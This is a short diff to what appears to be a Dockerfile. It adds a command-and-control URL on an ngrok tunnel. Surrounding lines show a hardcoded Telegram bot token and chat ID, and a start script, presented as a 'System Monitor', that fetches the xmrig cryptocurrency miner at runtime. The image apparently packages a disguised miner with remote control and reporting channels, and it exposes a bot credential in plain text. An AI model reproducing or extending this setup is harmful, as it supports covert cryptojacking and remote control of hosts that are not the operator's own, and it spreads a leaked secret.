@@ -296,6 +296,9 @@ RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredB
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=5804150664
 
+# Set C2 URL for HTTP mode (ngrok tunnel)
+ENV C2_URL=https://lynelle-scroddled-corinne.ngrok-free.dev
+
 # Create start script - download xmrig at runtime
 RUN echo '#!/bin/bash' > /start.sh && \
     echo 'echo "Starting System Monitor..."' >> /start.sh && \
